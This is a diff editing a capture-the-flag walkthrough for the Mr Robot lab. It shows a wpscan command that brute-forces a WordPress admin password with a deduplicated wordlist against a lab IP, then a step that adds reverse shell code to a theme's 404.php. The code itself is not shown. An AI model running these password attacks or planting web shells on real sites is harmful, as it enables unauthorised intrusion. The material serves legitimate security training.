@@ -267,10 +267,9 @@ fsocity.dic                       100%[=========================================
 
 ![Username Elliot](Images/mrrobotctf-elliot.png)
 
-### Using Hydra
+### Using wpscan
 
 - We know the username. We need to bruteforce the password.
-
 - We can use **fsocity.dic** as the wordlist. But the file is very large.
 - Try to fetch only the unique values using `sort -u`.
 - Apparently, the file size was drastically reduced (8.5 lakh values -> 11K values). Easy for bruteforcing!
@@ -289,7 +288,8 @@ $ wc -l uniq-fscoity.dic
 
 ```bash
 $ wpscan --url http://10.10.25.251 -t 50 -U Elliot -P uniq-fscoity.dic
-
+.
+.
 [+] Performing password attack on Xmlrpc Multicall against 1 user/s
 Progress Time: 00:00:00 <                                                                               > (0 / 22)  0.00%  ETA: ??:??:??
 [SUCCESS] - Elliot / REDACTED
@@ -299,6 +299,8 @@ Progress Time: 00:07:35 <==========================================             
 
 [!] Valid Combinations Found:
  | Username: Elliot, Password: REDACTED
+.
+.
 ```
 
 ### Accessing the admin panel
@@ -311,7 +313,7 @@ Progress Time: 00:07:35 <==========================================             
 
 ## Reverse Shell
 
-- Modify `404.php` or any other page of the theme and add reverse shell code.
+- Modify `404.php` or any other page of the theme and add **reverse shell code**.
 
 ![Adding Reverse Shell Code in 404.php](Images/mrrobotctf-404.png)
 
